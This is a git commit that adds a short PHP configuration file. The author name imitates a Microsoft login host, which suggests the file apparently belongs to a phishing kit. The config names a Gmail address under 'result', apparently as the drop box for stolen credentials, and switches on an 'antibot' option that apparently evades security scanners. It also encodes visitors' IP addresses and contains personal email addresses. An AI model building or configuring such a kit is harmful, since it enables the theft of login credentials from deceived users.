28a5605ca4cffe6966431c8bb24898b665af2916
login-srf-microsoftonline <isiahtrinityyurem98@gmail.com>
2021-02-06 03:45:00 -0800

    ssh

---
+++ config/config.php
@@ -0,0 +1,11 @@
+<?php
+$config = array(
+    'setpar' => 'on',
+    'par' => 'test',
+    'result' => 'kumasi4masi@gmail.com',
+    'antibot' => 'on'
+);
+
+$a = $_SERVER['REMOTE_ADDR'];
+$key = base64_encode($a);
+?>
